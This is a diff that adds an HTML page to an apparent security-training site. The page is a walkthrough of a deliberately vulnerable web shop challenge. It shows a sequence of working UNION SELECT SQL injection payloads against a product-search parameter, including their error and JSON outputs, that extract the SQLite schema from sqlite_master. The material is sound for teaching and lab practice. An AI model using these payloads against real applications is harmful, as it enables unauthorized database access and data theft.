@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>ASET - Database schema attack</title>
+    <link rel="stylesheet" type="text/css" href="../../style/style.css">
+    <link href="https://fonts.googleapis.com/css?family=Courgette&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Francois+One&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Merriweather:300,300i,400,400i,700,700i,900,900i&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <meta content="width=device-width, initial-scale=1" name="viewport" />
+    <meta charset="UTF-8">
+</head>
+
+<body>
+    <div class="navbar">
+        <div class="navbar-right">
+            <a href="../../index.html">Home</a>
+            <a href="../../tools/tools.html">Tools</a>
+            <div class="dropdown">
+                <button class="dropbtn">Attacks</button>
+                <div class="dropdown-content">
+                    <a href="../../attacks/all.html">All</a>
+                    <a href="../../attacks/sqlinjection.html">SQL injection</a>
+                    <a href="../../attacks/XSS.html">XSS</a>
+                    <a href="../../attacks/IUV.html">Improper Input Validation</a>
+                </div>
+            </div>
+            <a style="color: #7FFF00;" href="../../attacks/Injection/injection.html">Injection</a>
+        </div>
+    </div>
+
+    <div class="titlu">
+        <h1>Exfiltrate the entire DB schema definition <br> via SQL Injection</h1>
+    </div>
+    <br><br>
+    <p>
+        An attacker would try to exploit SQL Injection to find out as much as possible about your database schema. 
+        This subsequently allows much more targeted, stealthy and devastating SQL Injections, like Retrieve a list 
+        of all user credentials via SQL Injection.
+    </p>
+    <ul>
+        <li>Find out which database system is in use and where it would usually store its schema definitions.</li>
+        <li>Craft a UNION SELECT attack string to join the relevant data from any such identified system table 
+            into the original result.</li>
+        <li>You might have to tackle some query syntax issues step-by-step, basically hopping from one error to the next</li>
+        <li>As with Order the Christmas special offer of 2014 this cannot be achieved through the application frontend.</li>
+    </ul>
+
+    <p>
+        Steps:
+    </p>
+    <ul>
+        <li>From any errors seen during previous SQL Injection attempts you should know that SQLite is the relational database in use.</li>
+        <li>Check https://www.sqlite.org/faq.html to learn in "(7) How do I list all tables/indices contained in an SQLite database" that 
+            the schema is stored in a system table sqlite_master.</li>
+        <li>You will also learn that this table contains a column sql which holds the text of the original CREATE TABLE or CREATE INDEX 
+            statement that created the table or index. Getting your hands on this would allow you to replicate the entire DB schema.</li>
+        <li>During the Order the Christmas special offer of 2014 challenge you learned that the /rest/products/search endpoint is 
+            susceptible to SQL Injection into the q parameter.</li>
+        <li>The attack payload you need to craft is a UNION SELECT merging the data from the sqlite_master table into the products returned in the JSON result.</li>
+        <li>As a starting point we use the known working '))-- attack pattern and try to make a UNION SELECT out of it.</li>
+        <li>Searching for ')) UNION SELECT * FROM x-- fails with a SQLITE_ERROR: no such table: x as you would expect.</li>
+        <li>Searching for ')) UNION SELECT * FROM sqlite_master-- fails with a promising SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same 
+            number of result columns which least confirms the table name.</li>
+        <li>The next step in a UNION SELECT-attack is typically to find the right number of returned columns. As the Search Results table in the UI has 3 columns 
+            displaying data, it will probably at least be three. You keep adding columns until no more SQLITE_ERROR occurs (or at least it becomes a different one):
+            <ul>
+                <li>')) UNION SELECT '1' FROM sqlite_master-- fails with number of result columns error</li>
+                <li>')) UNION SELECT '1', '2' FROM sqlite_master-- fails with number of result columns error</li>
+                <li>')) UNION SELECT '1', '2', '3' FROM sqlite_master-- fails with number of result columns error</li>
+                <li>(...)</li>
+                <li>')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8' FROM sqlite_master-- still fails with number of result columns error</li>
+                <li>')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master-- finally gives you a JSON response back with an extra element 
+                {"id":"1","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"}.</li>
+              </li>
+          </ul>
+        <li>Next you get rid of the unwanted product results changing the query into something like qwert')) UNION SELECT '1', '2', '3', '4', '5', '6', '7',
+             '8', '9' FROM sqlite_master-- leaving only the "UNIONed" element in the result set</li>
+        <li>The last step is to replace one of the fixed values with correct column name sql, which is why searching for qwert')) UNION SELECT sql, '2', '3', 
+            '4', '5', '6', '7', '8', '9' FROM sqlite_master-- solves the challenge.</li>
+    </ul>
+
+    <ul class="liste">
+        <li><a href="VisualGeoStalking.mp4" target="_blank">Demo</a></li>
+    </ul>
+
+</body>
+
+</html>
